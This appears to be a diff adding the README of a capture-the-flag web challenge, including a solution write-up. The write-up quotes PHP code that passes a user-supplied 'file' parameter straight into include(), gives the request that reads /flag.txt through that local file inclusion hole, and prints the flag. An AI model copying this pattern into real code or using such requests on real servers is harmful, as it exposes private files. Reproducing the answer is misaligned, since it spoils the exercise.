@@ -1,0 +1,35 @@
+# Included
+
+## Description
+
+No story here. Just a simple web challenge.
+
+Tip: The flag is in /flag.txt
+
+## Dev Notes
+
+Files in `src/` are provided.
+
+Start: `make start`<br>
+Stop: `make stop`<br>
+
+## Solution
+Looking at `index.php` in the provided source, the lines that stand out are
+```
+<?php
+if(!isset($_GET['file'])) {
+    echo "<h1>Nothing to see here!</h1>";
+} else {
+    include($_GET['file']);
+}
+?>
+```
+So we should send a get request with a file parameter to include a file, let's try to include `/flag.txt`. Send the following request
+```
+http://localhost/?file=/flag.txt
+```
+
+And we see a flag:
+```
+gigem{s1mpl3_lfi_vuln} 
+```
